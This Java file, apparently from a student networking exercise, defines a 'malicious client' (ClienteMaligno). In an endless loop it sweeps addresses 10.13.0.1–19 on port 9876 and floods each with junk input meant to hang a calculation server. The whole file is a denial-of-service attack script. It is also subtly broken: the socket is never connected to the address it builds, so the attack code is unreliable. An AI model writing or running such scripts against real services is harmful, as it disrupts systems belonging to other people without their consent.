import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClienteMaligno{
	public ClienteMaligno (String ip){
		InetSocketAddress servidor=
				new InetSocketAddress(ip, 9876);
	}
	public void colgar() throws IOException{
		Socket socket=new Socket();
		InputStream is=socket.getInputStream();
		BufferedReader bfr=
				ClienteCalculo.getBufferedReader(
						is);
		OutputStream os=socket.getOutputStream();
		PrintWriter pw;
		pw=ClienteCalculo.getPrintWriter(os);
		for (int i=0;i<100;i++){
			pw.println("+++++");
			pw.println("aa");
			pw.println("bb");
			bfr.readLine();
		}
	}
	public static void darPasada(){
		for (int i=1;i<20;i++){
			ClienteMaligno conexion;
			conexion=new ClienteMaligno
					("10.13.0."+i);
			System.out.println(
				"Colgando 10.13.0."+i);
			try {
				conexion.colgar();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	public static void main(String[] args) {
		while (true){
				darPasada();
		}

	}

}
